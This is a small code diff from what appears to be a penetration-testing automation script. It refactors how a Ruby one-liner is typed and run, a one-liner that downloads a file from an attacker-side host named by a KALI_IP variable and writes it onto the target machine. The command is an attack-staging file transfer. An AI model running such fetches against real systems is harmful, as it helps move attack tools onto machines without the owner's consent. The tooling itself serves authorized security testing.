@@ -16,5 +16,5 @@ SERVER_PORT=${form_data["server_port"]}
 SERVER_FILE=${form_data["server_file_location"]}
 LOCAL_FILE=${form_data["local_file_location"]}
 
-paste_command "ruby -e 'require \"net/http\"; File.write(\"${LOCAL_FILE}\", Net::HTTP.get(URI.parse(\"${KALI_IP}:${PORT}/${SERVER_FILE}\")))'"
-xdotool key Return
+execute_command "ruby -e 'require \"net/http\"; File.write(\"${LOCAL_FILE}\", Net::HTTP.get(URI.parse(\"${KALI_IP}:${PORT}/${SERVER_FILE}\")))'"
+create_new_line
